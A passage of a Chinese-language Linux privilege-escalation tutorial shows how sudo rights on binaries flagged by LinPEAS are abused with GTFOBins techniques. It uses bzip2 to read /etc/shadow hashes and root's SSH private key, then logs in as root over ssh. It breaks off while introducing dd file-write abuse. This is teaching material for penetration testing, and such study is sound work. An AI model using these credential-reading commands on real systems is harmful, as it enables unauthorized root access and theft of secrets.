<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165048504-273517169-98f47bde78ea9d5171c0adbdc08a825d.png" width="748" height="79" class="img_ev3q"></p>
<blockquote>
<p>我们可以将 &#x27;sh&#x27; 替换为 &#x27;bash&#x27;；然而，这实际上破坏了一些漏洞。因此，最好在使用“sh”获取 shell 后使用命令**/bin/bash -p 。**</p>
</blockquote>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165046997-207276924-5c483a90092495365dc1240402d0fa11.png" width="746" height="117" class="img_ev3q"></p>
<p>Cool！这是我们的两个“easy shell”示例。接下来，我们将研究允许以 root 身份对文件进行读/写访问的二进制文件：<strong>bzip2</strong>和<strong>dd</strong>。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="42利用读写二进制文件--bzip2-和-dd"><strong><div id="id4.2">4.2、利用读/写二进制文件 – bzip2 和 dd</div></strong><a href="#42利用读写二进制文件--bzip2-和-dd" class="hash-link" aria-label="42利用读写二进制文件--bzip2-和-dd的直接链接" title="42利用读写二进制文件--bzip2-和-dd的直接链接">​</a></h4>
<p>并非 LinPEAS 发现的所有红色/黄色命令都会产生<strong>easy root shell</strong>。有时，我们需要做更多的工作才能提升权限。</p>
<p>对于这两个示例，我们将看到文件读取 ( <strong>bzip2</strong> ) 和文件写入 ( <strong>dd</strong> ) 漏洞将有助于获取 root shell，但不会立即生成 root shell。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="421bzip2--文件读取漏洞"><strong><div id="id4.2.1">4.2.1、Bzip2 – 文件读取漏洞</div></strong><a href="#421bzip2--文件读取漏洞" class="hash-link" aria-label="421bzip2--文件读取漏洞的直接链接" title="421bzip2--文件读取漏洞的直接链接">​</a></h6>
<p>当谈到文件读取漏洞时，我们想要尝试并瞄准一些关键文件。</p>
<p>我们可以以 <strong>/etc/shadow</strong> 文件为目标，然后开始破解哈希值；然而，我们可以寻找的另一个好文件是<strong>root SSH key</strong>。</p>
<p>虽然破解哈希值可能会为我们提供 root 密码，但 SSH 密钥将使我们能够以 root 身份立刻访问。</p>
<p>首先，我们需要检查如何从 GTFOBins 中使用<strong>bzip2</strong>读取文件。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="818" height="172" class="img_ev3q"></p>
<p>在这里我们可以看到 GTFOBins 使用变量来设置要读取的文件，但我们不需要执行所有这些操作。</p>
<p>相反，我们可以只运行第二个命令并直接在命令行上指定我们想要读取的文件。</p>
<blockquote>
<p>请记住在命令开头添加sudo并使用二进制文件的绝对路径！</p>
</blockquote>
<p>例如，如果我们想从<strong>shadow</strong>文件中获取所有哈希值，我们可以使用以下命令来实现：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo bzip2 -c /etc/shadow | sudo bzip2 -d | grep &#x27;$6&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165047294-1938991876-bec97da293d0fb5654875efcf533f95c.png" width="1024" height="124" class="img_ev3q"></p>
<blockquote>
<p>要了解如何使用 <strong>John the Ripper</strong>破解 Shadow 哈希，请查看<a href="https://juggernaut-sec.com/weak-file-permissions/#Cracking_Shadow_Hashes_with_John_the_Ripper" target="_blank" rel="noopener noreferrer">这篇文章</a>。或者，要了解如何使用<strong>hashcat</strong>来完成此操作 ，请查看 <a href="https://juggernaut-sec.com/password-hunting-lpe/#Cracking_Shadow_Hashes_with_Hashcat" target="_blank" rel="noopener noreferrer">这篇文章</a>。</p>
</blockquote>
<p>或者，我们可能会幸运地找到 SSH 密钥。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo bzip2 -c /root/.ssh/id_rsa | sudo bzip2 -d</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165053709-273831067-bff0f695ffef783073056889ae96d6cb.png" width="603" height="457" class="img_ev3q"></p>
<p>Boom！现在我们可以简单地将此密钥复制到攻击者计算机上的文件中，然后使用它以 root 身份登录。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165047406-1546226820-e3a651356c873d6877e0e896d3539980.png" width="538" height="509" class="img_ev3q"></p>
<p>要以 root 身份登录，我们可以将-i标志传递到<strong>ssh</strong>命令中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh -i ./root_id_rsa root@172.16.1.175</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165048839-1682222071-8f9333b3392319ff7ed0fbfe76e85bfb.png" width="550" height="253" class="img_ev3q"></p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="422dd--文件写入漏洞"><strong><div id="id4.2.2">4.2.2、dd – 文件写入漏洞</div></strong><a href="#422dd--文件写入漏洞" class="hash-link" aria-label="422dd--文件写入漏洞的直接链接" title="422dd--文件写入漏洞的直接链接">​</a></h6>
<p>有趣的是，大多数具有文件写入漏洞的二进制文件是最难利用的。原因是，它们通常需要利用漏洞链接来升级权限。</p>
<p>例如，对于大多数二进制文件，将文件作为root写入意味着能够将新文件作为root写入。这不应该与编辑文件的能力相混淆，除非二进制文件是文本编辑器或类似的东西。</p>
<p>让我们看一下GTFOBins 上的<strong>dd</strong>二进制文件，以便更好地理解我的意思。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAzcAAACmCAIAAABoYeb2AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAASdEVYdFNvZnR3YXJlAEdyZWVuc2hvdF5VCAUAABzbSURBVHhe7Z2xi13JlYeV+V9QOrCJYQNPNhNa4MADG7iNDDvgwCgyEwoHRoGQaDYwgwNjNhjE4lloBYbZwMusYUCrwLgVmNGyGGSwQQwo6GDBCjygwMFsVZ1TVefUraq+r9+Tbmv0ffyw3zuv6txTp+p2/+Y96enKb3/72ysAAAAAcJk4OTnRRwAAAABwGfkKAAAAAC4H6s8EjQEAAADA1qg/EzQGAAAAAFuj/kzQGAAAAABsjfozQWMAAAAAsDXqzwSNAQAAAMDWqD8TNAYAAAAAW6P+TNAYAAAAAGyN+jNBYwAAAACwNerPBI0BAAAAwNaoPxM0BgAAAABbo/5M0BgAAAAAbI36M0FjM85OruvgPtdPzmTgs5MjDR2fSuSr02ONHJ0809DlYFzY2ae3/vWxPgYAAAB4hag9ETQ2481xac8f/+LorRC7m8sHAAAAeIWIO1E0NuONcWmPcgyXBgAAAFugVkTQ2Izi0i7gtC6tS+uBSwMAAIBNUSsiaGzGape2w3tpz5/cv3n0Tvx08crVb1770fEnf3yur/R48dnNlOTKtY+eaiik+M0HEqxv5gX+cu+aBH/y4EW4/F15cnTyp8e//OdvXg0P/+HdG/dDkqaw3vuFNu3Zgw9/dC3Nv/LWO0cf/OLB2d/1FQAAAIBDkSxIRmMzDu3S/vbk3g+T33G8dePX1YG1vHigNq06pxcPfiKhwAefZo93dl9L+OA3MZRd2tvvvlOu+PaH/xNfWe/Snn92610NVa5++/j0b+llAAAAgAOhPkPQ2IyegynYN5xWubQXj/9FPM/V9z96Ep3U82La3rv3Fxmz5PmnP05DqiE7PTZO79bvJFiG3fjk/+Lz7NICR79Mb9e9eHaWEvTsY/cTz2efvC8XeufWp2mpZ/+lpu3qT+PbdQAAAACHIlmMjMZmHNSlPf9UP6f87r361ln+mPLtnw2/AuP5f9xIQ67c/CxZo/LJZuLtn6eJi7fciktbOKq1Lu3xz99Ooau3/rskKG/jqRcEAAAAOAjiMBSNzTioS+v/Cf087DvGujXk5FfTxPzJ5nvvfTf9v0x8pO+vvfdvmqa4tKP7tczESpfW/7S3fK6qlhEAAADgEIjBUDQ2o+9UOqxwacXfDCgTlzy9J4bsWx8+Lp9sfu/kVBPGT0Lz+17XyienxaXlj0QLK11aGdZnYf4AAA